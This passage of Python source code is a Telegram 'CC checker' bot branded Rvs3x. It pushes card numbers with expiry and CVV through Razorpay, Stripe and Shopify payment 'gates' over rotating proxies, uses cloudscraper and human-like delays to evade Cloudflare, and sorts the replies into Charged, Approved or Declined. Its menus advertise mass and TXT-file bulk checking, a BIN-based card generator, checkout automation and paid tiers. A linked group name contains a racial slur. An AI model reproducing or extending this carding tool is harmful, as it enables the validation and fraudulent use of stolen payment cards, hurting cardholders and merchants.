                if proxy_data:
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                return {"Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy", "Price": "-", "Gateway": f"Razorpay ₹{amount}", "Status": "Proxy Dead"}
            return {"Response": "Connection Error", "Price": "-", "Gateway": f"Razorpay ₹{amount}"}

        if res.status_code != 200:
            error_text = res.text
            if 'cloudflare' in error_text.lower() or 'challenge' in error_text.lower() or 'just a moment' in error_text.lower():
                return {"Response": "Cloudflare blocked! Try a different proxy.", "Price": "-", "Gateway": f"Razorpay ₹{amount}"}
            return {"Response": f"HTTP_ERROR_{res.status_code}", "Price": "-", "Gateway": f"Razorpay ₹{amount}"}

        try:
            response_json = res.json()
        except:
            response_text = res.text
            return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": f"Razorpay ₹{amount}"}

        # Parse the Razorpay API response
        # API returns: {"message": "...", "status": "...", "reason": "..."}
        message = response_json.get('message', '')
        status = response_json.get('status', '')
        reason = response_json.get('reason', '')
        
        # For success/charged: show message field (e.g., "Payment Successful")
        # For declined: show message field (e.g., "3DS_CHALLENGE_REQUIRED")
        # Enhanced success detection - check multiple indicators
        status_lower = status.lower() if status else ''
        message_lower = message.lower() if message else ''
        reason_lower = reason.lower() if reason else ''

        is_success = (
            status_lower == 'success' or 
            status_lower == 'captured' or
            status_lower == 'authorized' or
            'success' in message_lower or 
            'charged' in message_lower or 
            'captured' in message_lower or
            'authorized' in message_lower or
            'order completed' in message_lower or
            'payment successful' in message_lower or
            'approved' in message_lower or
            'payment captured' in reason_lower or
            'captured' in reason_lower
        )
        
        if is_success:
            api_response = message  # Show message for success
            api_status = "Charged"
        else:
            api_response = message if message else reason  # Show message for declined
            api_status = reason if reason else status
        
        price = response_json.get('Price', '-')
        if price == '-' or price == '':
            price = f"₹{amount}"
        elif price != '-':
            price = f"₹{price}"

        gateway = f"Razorpay ₹{amount}"

        return {
            "Response": api_response,
            "Price": price,
            "Gateway": gateway,
            "Status": api_status
        }

    except Exception as e:
        return {"Response": str(e)[:200], "Price": "-", "Gateway": f"Razorpay ₹{amount}"}


async def check_card_razorpay_with_proxy(card, proxy_data, amount="1"):
    """Check a card using Razorpay endpoint with a specific proxy"""
    try:
        # Build Razorpay API URL
        url = f'{RZP_API_ENDPOINT}?cc={card}&site={DEFAULT_RZP_SITE}&amount={amount}'

        # Build proxy dict
        proxies = None
        if proxy_data:
            proxy_url = proxy_data.get('proxy_url')
            proxies = {"http": proxy_url, "https": proxy_url}

        loop = asyncio.get_event_loop()
        
        def make_request():
            try:
                scraper = cloudscraper.create_scraper()
                res = scraper.get(url, timeout=100, proxies=proxies)
                return res
            except Exception as e:
                return e
        
        res = await loop.run_in_executor(None, make_request)
        
        if isinstance(res, Exception):
            error_str = str(res)
            return {"Response": f"Request failed: {error_str[:100]}", "Price": "-", "Gateway": f"Razorpay ₹{amount}"}

        if res.status_code != 200:
            return {"Response": f"HTTP_ERROR_{res.status_code}", "Price": "-", "Gateway": f"Razorpay ₹{amount}"}

        try:
            response_json = res.json()
        except:
            return {"Response": f"Invalid JSON response", "Price": "-", "Gateway": f"Razorpay ₹{amount}"}

        # Parse the Razorpay API response
        # API returns: {"message": "...", "status": "...", "reason": "..."}
        message = response_json.get('message', '')
        status = response_json.get('status', '')
        reason = response_json.get('reason', '')
        
        # For success/charged: show message field (e.g., "Payment Successful")
        # For declined: show message field (e.g., "3DS_CHALLENGE_REQUIRED")
        # Enhanced success detection - check multiple indicators
        status_lower = status.lower() if status else ''
        message_lower = message.lower() if message else ''
        reason_lower = reason.lower() if reason else ''

        is_success = (
            status_lower == 'success' or 
            status_lower == 'captured' or
            status_lower == 'authorized' or
            'success' in message_lower or 
            'charged' in message_lower or 
            'captured' in message_lower or
            'authorized' in message_lower or
            'order completed' in message_lower or
            'payment successful' in message_lower or
            'approved' in message_lower or
            'payment captured' in reason_lower or
            'captured' in reason_lower
        )
        
        if is_success:
            api_response = message  # Show message for success
            api_status = "Charged"
        else:
            api_response = message if message else reason  # Show message for declined
            api_status = reason if reason else status
        
        price = response_json.get('Price', '-')
        if price == '-' or price == '':
            price = f"₹{amount}"
        elif price != '-':
            price = f"₹{price}"

        gateway = f"Razorpay ₹{amount}"

        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": api_status}

    except Exception as e:
        return {"Response": str(e)[:200], "Price": "-", "Gateway": f"Razorpay ₹{amount}"}


# --- Stripe Auth Functions ---

async def check_card_stripe_auth(card, site=None):
    """Check a card using Stripe Auth endpoint with cloudscraper (no proxy)"""
    # Use provided site or pick random from defaults
    if not site:
        site = random.choice(DEFAULT_STRIPE_SITES)

    try:
        # Build Stripe Auth API URL
        url = f'{STRIPE_API_ENDPOINT}/site={site}/cc={card}'

        loop = asyncio.get_event_loop()
        
        def make_request():
            try:
                # Simple headers for API request
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.9',
                }
                
                # Use requests instead of cloudscraper for API calls
                import requests
                
                # Add delay to mimic human behavior
                time.sleep(random.uniform(1, 3))
                
                res = requests.get(url, headers=headers, timeout=100)
                return res
            except Exception as e:
                return e
        
        # Run in executor to make it async
        res = await loop.run_in_executor(None, make_request)
        
        # Check if exception was returned
        if isinstance(res, Exception):
            return {"Response": "Connection Error", "Price": "-", "Gateway": "Stripe Auth"}

        if res.status_code != 200:
            error_text = res.text
            if 'cloudflare' in error_text.lower() or 'challenge' in error_text.lower() or 'just a moment' in error_text.lower():
                return {"Response": "Cloudflare blocked!", "Price": "-", "Gateway": "Stripe Auth"}
            return {"Response": f"HTTP_ERROR_{res.status_code}", "Price": "-", "Gateway": "Stripe Auth"}

        try:
            response_json = res.json()
        except:
            # Try to get text response
            try:
                response_text = res.text
                # Check if it's HTML error page
                if '<html' in response_text.lower() or '<!doctype' in response_text.lower():
                    return {"Response": "Site returned HTML (blocked)", "Price": "-", "Gateway": "Stripe Auth"}
                # Check if it's binary/garbage
                if not response_text or len(response_text.strip()) < 10:
                    return {"Response": "Empty or invalid response from API", "Price": "-", "Gateway": "Stripe Auth"}
                return {"Response": f"API Error: {response_text[:100]}", "Price": "-", "Gateway": "Stripe Auth"}
            except:
                return {"Response": "Failed to read API response", "Price": "-", "Gateway": "Stripe Auth"}

        # Parse the Stripe Auth API response
        # API returns: {"response": "Succeeded", "status": "Approved"}
        api_response = response_json.get('response', '')
        api_status = response_json.get('status', '')
        
        # If API failed to extract nonce, retry once with delay
        if "failed to extract" in api_response.lower() or "nonce" in api_response.lower():
            # Wait and retry
            await asyncio.sleep(3)
            
            def retry_request():
                try:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'en-US,en;q=0.9',
                    }
                    import requests
                    time.sleep(random.uniform(2, 4))
                    res = requests.get(url, headers=headers, timeout=100)
                    return res
                except Exception as e:
                    return e
            
            retry_res = await loop.run_in_executor(None, retry_request)
            
            if not isinstance(retry_res, Exception) and retry_res.status_code == 200:
                try:
                    response_json = retry_res.json()
                    api_response = response_json.get('response', api_response)
                    api_status = response_json.get('status', api_status)
                except:
                    pass
        
        if not api_response:
            # Fallback to other fields
            reason = response_json.get('reason', '')
            message = response_json.get('message', '')
            status = response_json.get('status', '')
            
            if reason:
                api_response = reason
            elif message:
                api_response = message
            elif status:
                api_response = status
        
        price = response_json.get('Price', '-')
        if price != '-' and price != '':
            price = f"${price}"

        gateway = response_json.get('Gate', 'Stripe Auth')
        
        # Get the actual status from API (Approved/Declined)
        api_status = response_json.get('status', '')

        return {
            "Response": api_response,
            "Price": price,
            "Gateway": gateway,
            "Status": api_status
        }

    except Exception as e:
        return {"Response": str(e)[:200], "Price": "-", "Gateway": "Stripe Auth"}


client = TelegramClient('cc_bot', API_ID, API_HASH)

def banned_user_message():
    return "🚫 **𝙔𝙤𝙪 𝘼𝙧𝙚 𝘽𝙖𝙣𝙣𝙚𝙙!**\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭"

def access_denied_message_with_button():
    """Returns access denied message and join group button"""
    message = "🚫 **Access Denied!** This command requires premium access or group usage."
    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/+9prhieUj5lI2NTFl")]]
    return message, buttons

# --- Bot Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]start$'))
async def start(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())

    # Animated loading
    animated_texts = ["〔", "〔R", "〔Rv", "〔Rvs", "〔Rvs3x〕"]
    sent = await event.reply("<pre>〔</pre>", parse_mode='html')
    
    for text in animated_texts[1:]:
        await asyncio.sleep(0.2)
        await sent.edit(f"<pre>{text}</pre>", parse_mode='html')
    
    await asyncio.sleep(0.3)
    
    # User info
    user = await event.get_sender()
    name = user.first_name
    if user.last_name:
        name += f" {user.last_name}"
    profile = f"<a href='tg://user?id={user.id}'>{name}</a>"
    
    # Check if user is registered (for displaying correct limit)
    is_reg = await is_registered_user(event.sender_id)
    
    # Status
    if access_type == "admin":
        status = "👑 Admin"
        limit = "∞ Unlimited"
    elif access_type in ["premium_private", "premium_group"]:
        status = "💎 Premium"
        limit = f"{get_cc_limit(access_type, event.sender_id)} CCs"
    elif access_type == "group_free":
        status = "🆓 Free"
        limit = "100 CCs"
    elif is_reg:
        # Registered but in private (no_access) - show 100 CCs
        status = "🆓 Free"
        limit = "100 CCs"
    else:
        status = "🆓 Free"
        limit = "0 CCs"
    
    final_text = f"""
[<a href='https://t.me/rev3rsexmain'>⛯</a>] <b>Rvs3x | Version - 2.0</b>
<pre>Constantly Upgrading...</pre>
━━━━━━━━━━━━━
<b>Hello,</b> {profile}
<i>How Can I Help You Today.?! 📊</i>
⌀ <b>Your UserID</b> - <code>{user.id}</code>
⛶ <b>BOT Status</b> - <code>Online 🟢</code>
⎔ <b>Your Plan</b> - <code>{status}</code>
⎔ <b>Your Limit</b> - <code>{limit}</code>
<b>Explore - Click the buttons below to discover</b>
<b>all the features we offer!</b>
"""

    buttons = [
        [Button.inline("Register", b"register"), Button.inline("Commands", b"home_menu")],
        [Button.inline("Close", b"close")]
    ]
    
    await sent.edit(final_text.strip(), buttons=buttons, parse_mode='html', link_preview=False)

# Callback handlers for start menu
@client.on(events.CallbackQuery(pattern=b"close"))
async def close_callback(event):
    await event.edit("<pre>Thanks For Using #Rvs3x</pre>", parse_mode='html')

@client.on(events.CallbackQuery(pattern=b"home_menu"))
async def home_menu_callback(event):
    home_text = """<pre>JOIN BEFORE USING. ✔️</pre>
<b>~ Main :</b> <b><a href="https://t.me/rev3rsexmain">Join Now</a></b>
<b>~ Chat Group :</b> <b><a href="https://t.me/Stripenigga">Join Now</a></b>
<b>~ Scrapper :</b> <b><a href="https://t.me/+1741zA41XcMzMDdl">Join Now</a></b>
<b>~ Note :</b> <code>Report Bugs To @rev3rsexbot</code>
<b>~ Proxy :</b> <code>Live 💎</code>
<pre>Choose Your Gate Type :</pre>"""

    home_buttons = [
        [Button.inline("Gates", b"gates"), Button.inline("Tools", b"tools")],
        [Button.inline("Back", b"start_back"), Button.inline("Close", b"close")]
    ]
    
    await event.edit(home_text, buttons=home_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"start_back"))
async def start_back_callback(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    
    user = await event.get_sender()
    name = user.first_name
    if user.last_name:
        name += f" {user.last_name}"
    profile = f"<a href='tg://user?id={user.id}'>{name}</a>"
    
    # Check if user is registered (for displaying correct limit)
    is_reg = await is_registered_user(event.sender_id)
    
    if access_type == "admin":
        status = "👑 Admin"
        limit = "∞ Unlimited"
    elif access_type in ["premium_private", "premium_group"]:
        status = "💎 Premium"
        limit = f"{get_cc_limit(access_type, event.sender_id)} CCs"
    elif access_type == "group_free":
        status = "🆓 Free"
        limit = "100 CCs"
    elif is_reg:
        # Registered but in private (no_access) - show 100 CCs
        status = "🆓 Free"
        limit = "100 CCs"
    else:
        status = "🆓 Free"
        limit = "0 CCs"
    
    final_text = f"""
[<a href='https://t.me/rev3rsexmain'>⛯</a>] <b>Rvs3x | Version - 2.0</b>
<pre>Constantly Upgrading...</pre>
━━━━━━━━━━━━━
<b>Hello,</b> {profile}
<i>How Can I Help You Today.?! 📊</i>
⌀ <b>Your UserID</b> - <code>{user.id}</code>
⛶ <b>BOT Status</b> - <code>Online 🟢</code>
⎔ <b>Your Plan</b> - <code>{status}</code>
⎔ <b>Your Limit</b> - <code>{limit}</code>
<b>Explore - Click the buttons below to discover</b>
<b>all the features we offer!</b>
"""

    buttons = [
        [Button.inline("Register", b"register"), Button.inline("Commands", b"home_menu")],
        [Button.inline("Close", b"close")]
    ]
    
    await event.edit(final_text.strip(), buttons=buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"gates"))
async def gates_callback(event):
    gates_buttons = [
        [Button.inline("Auth", b"auth"), Button.inline("Charge", b"charge")],
        [Button.inline("Back", b"home_menu"), Button.inline("Close", b"close")]
    ]
    gates_text = "<pre>Choose Gate Type:</pre>"
    await event.edit(gates_text, buttons=gates_buttons, parse_mode='html')

@client.on(events.CallbackQuery(pattern=b"auth"))
async def auth_callback(event):
    auth_text = """<pre>#Rvs3x 〔AUTH GATES〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Name</b>: <code>Stripe Auth</code>
⟐ <b>Command</b>: <code>/au cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/mau cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/autxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Limit</b>: <code>As Per User's Plan</code>
"""
    auth_buttons = [
        [Button.inline("Back", b"gates"), Button.inline("Close", b"close")]
    ]
    await event.edit(auth_text, buttons=auth_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"charge"))
async def charge_callback(event):
    charge_text = """<pre>#Rvs3x 〔CHARGE GATES〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Name</b>: <code>Shopify Self</code>
⟐ <b>Command</b>: <code>/sh cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/msh cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/mtxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
═══════════════════
⟐ <b>Name</b>: <code>Razorpay</code>
⟐ <b>Command</b>: <code>/rzp cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/mrzp cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/rztxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
═══════════════════
⟐ <b>Name</b>: <code>Random Sites</code>
⟐ <b>Command</b>: <code>/ran</code> (TXT file)
⟐ <b>Status</b>: <code>Active ✅</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Site Cmd</b>: <code>/add site.com</code>
⟐ <b>Check Cmd</b>: <code>/check</code>
"""
    charge_buttons = [
        [Button.inline("Back", b"gates"), Button.inline("Close", b"close")]
    ]
    await event.edit(charge_text, buttons=charge_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"shopify"))
async def shopify_callback(event):
    shopify_text = """<pre>#Shopify 〔Charge〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Name</b>: <code>Shopify Self</code>
⟐ <b>Command</b>: <code>/sh cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/msh cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/mtxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
═══════════════════
⟐ <b>Name</b>: <code>Random Sites</code>
⟐ <b>Command</b>: <code>/ran</code> (TXT file)
⟐ <b>Status</b>: <code>Active ✅</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Site Cmd</b>: <code>/add site.com</code>
⟐ <b>Check Cmd</b>: <code>/check</code>
"""
    shopify_buttons = [
        [Button.inline("Back", b"charge"), Button.inline("Close", b"close")]
    ]
    await event.edit(shopify_text, buttons=shopify_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"razorpay"))
async def razorpay_callback(event):
    razorpay_text = """<pre>#Razorpay 〔Charge〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Name</b>: <code>Razorpay ₹1</code>
⟐ <b>Command</b>: <code>/rzp cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/mrzp cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/rztxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Limit</b>: <code>As Per User's Plan</code>
"""
    razorpay_buttons = [
        [Button.inline("Back", b"charge"), Button.inline("Close", b"close")]
    ]
    await event.edit(razorpay_text, buttons=razorpay_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"txt_checker"))
async def txt_checker_callback(event):
    txt_text = """<pre>#Rvs3x 〔TXT File Checker〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>Available Gates:</b>
⟐ <code>/mtxt</code>
⟐ <code>/rztxt</code>
⟐ <code>/autxt</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>Features:</b>
⟐ Upload TXT file with cards
⟐ View Charged/Approved/Declined
⟐ Stop checking anytime
"""
    txt_buttons = [
        [Button.inline("Back", b"charge"), Button.inline("Close", b"close")]
    ]
    await event.edit(txt_text, buttons=txt_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"tools"))
async def tools_callback(event):
    tools_text = """<pre>#Rvs3x 〔TOOLS〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>• Site Management:</b>
⟐ <code>/add site.com</code>
⟐ <code>/rm site.com</code>
⟐ <code>/check</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>• Proxy Tools:</b>
⟐ <code>/addpxy ip:port</code>
⟐ <code>/proxy</code>
⟐ <code>/rmpxy 1</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>• Checkout:</b>
⟐ <code>/co url</code>
⟐ <code>/co url cc|mm|yy|cvv</code>
⟐ <code>/co yes url cc|mm|yy|cvv</code>
<b>• Generator:</b>
⟐ <code>/gen BIN|MM|YY|CVV {amount}</code>
<b>• Other:</b>
⟐ <code>/info</code>
⟐ <code>/redeem KEY</code>
"""
    tools_buttons = [
        [Button.inline("Back", b"home_menu"), Button.inline("Close", b"close")]
    ]
    await event.edit(tools_text, buttons=tools_buttons, parse_mode='html', link_preview=False)

# /cmds specific callbacks
@client.on(events.CallbackQuery(pattern=b"cmds_gates"))
async def cmds_gates_callback(event):
    gates_buttons = [
        [Button.inline("Auth", b"cmds_auth"), Button.inline("Charge", b"cmds_charge")],
        [Button.inline("Back", b"cmds_back"), Button.inline("Close", b"close")]
    ]
    gates_text = "<pre>Choose Gate Type:</pre>"
    await event.edit(gates_text, buttons=gates_buttons, parse_mode='html')

@client.on(events.CallbackQuery(pattern=b"cmds_auth"))
async def cmds_auth_callback(event):
    auth_text = """<pre>#Rvs3x 〔AUTH GATES〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Name</b>: <code>Stripe Auth</code>
⟐ <b>Command</b>: <code>/au cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/mau cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/autxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Limit</b>: <code>As Per User's Plan</code>
"""
    auth_buttons = [
        [Button.inline("Back", b"cmds_gates"), Button.inline("Close", b"close")]
    ]
    await event.edit(auth_text, buttons=auth_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"cmds_charge"))
async def cmds_charge_callback(event):
    charge_text = """<pre>#Rvs3x 〔CHARGE GATES〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Name</b>: <code>Shopify Self</code>
⟐ <b>Command</b>: <code>/sh cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/msh cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/mtxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
═══════════════════
⟐ <b>Name</b>: <code>Razorpay</code>
⟐ <b>Command</b>: <code>/rzp cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/mrzp cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/rztxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
═══════════════════
⟐ <b>Name</b>: <code>Random Sites</code>
⟐ <b>Command</b>: <code>/ran</code> (TXT file)
⟐ <b>Status</b>: <code>Active ✅</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Limit</b>: <code>As Per User's Plan</code>
"""
    charge_buttons = [
        [Button.inline("Back", b"cmds_gates"), Button.inline("Close", b"close")]
    ]
    await event.edit(charge_text, buttons=charge_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"cmds_shopify"))
async def cmds_shopify_callback(event):
    shopify_text = """<pre>#Shopify 〔Charge〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Name</b>: <code>Shopify Self</code>
⟐ <b>Command</b>: <code>/sh cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/msh cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/mtxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
═══════════════════
⟐ <b>Name</b>: <code>Random Sites</code>
⟐ <b>Command</b>: <code>/ran</code> (TXT file)
⟐ <b>Status</b>: <code>Active ✅</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Site Cmd</b>: <code>/add site.com</code>
⟐ <b>Check Cmd</b>: <code>/check</code>
"""
    shopify_buttons = [
        [Button.inline("Back", b"cmds_charge"), Button.inline("Close", b"close")]
    ]
    await event.edit(shopify_text, buttons=shopify_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"cmds_razorpay"))
async def cmds_razorpay_callback(event):
    razorpay_text = """<pre>#Razorpay 〔Charge〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Name</b>: <code>Razorpay ₹1</code>
⟐ <b>Command</b>: <code>/rzp cc|mm|yy|cvv</code>
⟐ <b>Mass Cmd</b>: <code>/mrzp cc|mm|yy|cvv</code>
⟐ <b>TXT Cmd</b>: <code>/rztxt</code>
⟐ <b>Status</b>: <code>Active ✅</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
⟐ <b>Limit</b>: <code>As Per User's Plan</code>
"""
    razorpay_buttons = [
        [Button.inline("Back", b"cmds_charge"), Button.inline("Close", b"close")]
    ]
    await event.edit(razorpay_text, buttons=razorpay_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"cmds_txt_checker"))
async def cmds_txt_checker_callback(event):
    txt_text = """<pre>#Rvs3x 〔TXT File Checker〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>Available Gates:</b>
⟐ <code>/mtxt</code>
⟐ <code>/rztxt</code>
⟐ <code>/autxt</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>Features:</b>
⟐ Upload TXT file with cards
⟐ View Charged/Approved/Declined
⟐ Stop checking anytime
"""
    txt_buttons = [
        [Button.inline("Back", b"cmds_charge"), Button.inline("Close", b"close")]
    ]
    await event.edit(txt_text, buttons=txt_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"cmds_tools"))
async def cmds_tools_callback(event):
    tools_text = """<pre>#Rvs3x 〔TOOLS〕</pre>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>• Site Management:</b>
⟐ <code>/add site.com</code>
⟐ <code>/rm site.com</code>
⟐ <code>/check</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>• Proxy Tools:</b>
⟐ <code>/addpxy ip:port</code>
⟐ <code>/proxy</code>
⟐ <code>/rmpxy 1</code>
━ ━ ━ ━ ━━━ ━ ━ ━ ━
<b>• Generator:</b>
⟐ <code>/gen BIN|MM|YY|CVV {amount}</code>
<b>• Checkout:</b>
⟐ <code>/co url</code>
⟐ <code>/co url cc|mm|yy|cvv</code>
⟐ <code>/co yes url cc|mm|yy|cvv</code>
<b>• Generator:</b>
⟐ <code>/gen BIN|MM|YY|CVV {amount}</code>
<b>• Other:</b>
⟐ <code>/info</code>
⟐ <code>/redeem KEY</code>
"""
    tools_buttons = [
        [Button.inline("Back", b"cmds_back"), Button.inline("Close", b"close")]
    ]
    await event.edit(tools_text, buttons=tools_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"cmds_back"))
async def cmds_back_callback(event):
    cmds_text = """<pre>JOIN BEFORE USING. ✔️</pre>
<b>~ Main :</b> <b><a href="https://t.me/rev3rsexmain">Join Now</a></b>
<b>~ Chat Group :</b> <b><a href="https://t.me/Stripenigga">Join Now</a></b>
<b>~ Scrapper :</b> <b><a href="https://t.me/+1741zA41XcMzMDdl">Join Now</a></b>
<b>~ Note :</b> <code>Report Bugs To @rev3rsexbot</code>
<b>~ Proxy :</b> <code>Live 💎</code>
<pre>Choose Your Gate Type :</pre>"""

    cmds_buttons = [
        [Button.inline("Gates", b"cmds_gates"), Button.inline("Tools", b"cmds_tools")],
        [Button.inline("Close", b"close")]
    ]
    
    await event.edit(cmds_text, buttons=cmds_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"register"))
async def register_callback(event):
    user = await event.get_sender()
    user_id = user.id

    # Check if already registered (has sites, premium, or in free_users)
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    is_premium = await is_premium_user(user_id)
    free_users = await load_json(FREE_FILE)
    is_registered = str(user_id) in free_users

    if user_sites or is_premium or is_registered:
        # User is already registered - show their info with limit
        _, access_type = await can_use(user_id, event.chat)

        if access_type == "admin":
            limit_text = "∞ Unlimited"
        elif is_premium:
            limit_text = "5000 CCs"
        else:
            # Registered free users always show 100 CCs
            limit_text = "100 CCs"

        buttons = [
            [Button.inline("Home", b"home_menu"), Button.inline("Close", b"close")]
        ]
        await event.edit(f"""<pre>Already Registered! ✅</pre>
╭━━━━━━━━━━
│● <b>Name</b> : <code>{user.first_name}</code>
│● <b>UserID</b> : <code>{user_id}</code>
│● <b>Plan</b> : <code>{'💎 Premium' if is_premium else '🆓 Free'}</code>
│● <b>Limit</b> : <code>{limit_text}</code>
╰━━━━━━━━━━

<i>You are already registered!</i>""", buttons=buttons, parse_mode='html')
        return

    # Register new user with free plan
    free_users[str(user_id)] = {
        'registered_at': datetime.datetime.now().isoformat(),
        'name': user.first_name
    }
    await save_json(FREE_FILE, free_users)

    buttons = [
        [Button.inline("Home", b"home_menu"), Button.inline("Close", b"close")]
    ]

    await event.edit(f"""<pre>Registration Successful! ✔</pre>
╭━━━━━━━━━━
│● <b>Name</b> : <code>{user.first_name}</code>
│● <b>UserID</b> : <code>{user_id}</code>
│● <b>Plan</b> : <code>Free 🆓</code>
│● <b>Limit</b> : <code>100 CCs</code>
╰━━━━━━━━━━

<i>Use /add to add your first site!</i>""", buttons=buttons, parse_mode='html')

@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID: return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /auth {user_id} {days}")
        user_id = int(parts[1])
        days = int(parts[2])
        await add_premium_user(user_id, days)
        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙜𝙧𝙖𝙣𝙩𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪m 𝙖𝙘𝙘𝙚𝙨𝙨!")
